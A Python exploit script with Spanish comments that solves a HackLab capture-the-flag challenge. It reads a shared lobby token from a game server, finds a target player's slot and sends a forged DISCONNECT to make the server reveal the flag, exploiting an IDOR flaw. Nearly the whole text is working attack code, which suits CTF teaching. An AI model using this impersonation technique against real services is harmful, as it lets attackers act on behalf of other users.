#!/usr/bin/env python3
# Exploit: El Estanque de Pepe (HackLab)
# Falla: el servidor identifica al actor solo por el slot Pxx; el token de lobby
# (campo A) es compartido por TODO el lobby. Conociendo el token (nos lo dan) y
# el slot de gochi, podemos enviar un DISCONNECT en su nombre -> IDOR / falta de
# autorizacion. El server manda la flag al chat cuando gochi queda fuera.
import socket, time, re, sys

HOST = "pesca.shared.softwareseguro.com.ar"
PORT = 6767
TARGET = "xX_gochi_Xx"

def main():
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(0.6)
    print(f"[+] conectado a {HOST}:{PORT}")

    def send(line):
        print("[>]", repr(line))
        s.sendall(line.encode() if line.endswith("\n") else (line+"\n").encode())

    buf = b""
    def pump(seconds):
        nonlocal buf
        end = time.time() + seconds
        got = []
        while time.time() < end:
            try:
                d = s.recv(4096)
                if not d:
                    print("  [!] servidor cerro"); break
                buf += d
                while b"\n" in buf:
                    ln, buf2 = buf.split(b"\n", 1)
                    buf = buf2
                    dec = ln.decode("latin1")
                    got.append(dec)
                    print("  <<<", repr(dec))
            except socket.timeout:
                pass
        return got

    # 1) handshake
    send("GET_LOBBY")
    lines = pump(3)

    # token de lobby (campo A)
    token = None
    for ln in lines:
        if ln.startswith("LOBBY:"):
            token = ln[len("LOBBY:"):].rstrip(";")
    if not token:
        print("[!] no se obtuvo token de lobby"); return
    print(f"[i] token de lobby (A) = {token!r}")

    # 2) unirse para recibir el roster completo
    send(f"{token}:P00:JOIN:JugadorZZ")
    lines = pump(5)

    # 3) encontrar el slot de gochi en el roster
    slot = None
    pat = re.compile(rf"{re.escape(token)}:(P\d+):JOIN:{re.escape(TARGET)}:")
    for ln in lines:
        m = pat.search(ln)
        if m:
            slot = m.group(1)
    if not slot:
        # reintento: pedir lobby de nuevo
        send("GET_LOBBY")
        for ln in pump(3):
            m = pat.search(ln)
            if m: slot = m.group(1)
    if not slot:
        print(f"[!] no encontre a {TARGET} en el lobby (quizas no esta conectado ahora)"); return
    print(f"[i] {TARGET} esta en el slot {slot!r}")

    # 4) EXPLOIT: desconectar a gochi usando su slot (token compartido)
    send(f"{token}:{slot}:DISCONNECT")

    # 5) escuchar la flag en el chat: llega como <token>:SERVER:FLAG:<flag>;
    deadline = time.time() + 12
    while time.time() < deadline:
        for ln in pump(2):
            if ":FLAG:" in ln:
                flag = ln.split(":FLAG:", 1)[1].rstrip(";")
                print("\n[*] FLAG:", flag)
                deadline = 0
                break
    s.close()
    print("[+] fin")

if __name__ == "__main__":
    main()
